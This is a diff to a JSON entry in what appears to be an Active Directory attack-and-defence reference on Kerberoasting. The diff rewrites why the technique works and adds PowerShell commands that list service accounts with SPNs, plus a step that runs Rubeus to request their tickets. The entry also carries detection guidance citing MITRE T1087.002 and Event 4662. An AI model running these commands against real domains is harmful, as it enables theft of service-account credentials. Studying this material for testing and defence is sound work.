@@ -63,7 +63,7 @@
     }
   ],
   "defense": {
-    "why_it_works": "Get-ADUser -Filter {ServicePrincipalName -like '*'} lists accounts with SPNs - the Kerberoasting target list.",
+    "why_it_works": "In Active Directory the default security descriptor grants the built-in 'Authenticated Users' group read access to nearly every directory object (users, groups, computers, GPOs, trusts) and their attributes. So any valid domain account — however low-privileged — can enumerate the whole directory over LDAP/SAMR without hitting access-denied, which is why this returns data without needing admin. servicePrincipalName is a readable user attribute, so filtering for accounts that have one reveals every Kerberoastable service account.",
     "prerequisites": "Valid domain credentials (any authenticated user) and network access to a DC (LDAP 389/636).",
     "impact": "A list of Kerberoastable service accounts.",
     "detection": "[MITRE T1087.002] Broad/bulk LDAP queries to the DC (Event 4662 directory-service access; Microsoft Defender for Identity reconnaissance alerts); one host reading large swaths of the directory in a short window.",
@@ -80,5 +80,21 @@
   },
   "tools": [
     "ActiveDirectory"
+  ],
+  "variations": [
+    {
+      "label": "Show the SPN values",
+      "command": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName | select name,ServicePrincipalName"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find SPN (service) accounts",
+      "command": "Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName"
+    },
+    {
+      "label": "Kerberoast them",
+      "command": ".\\Rubeus.exe kerberoast /nowrap"
+    }
   ]
 }
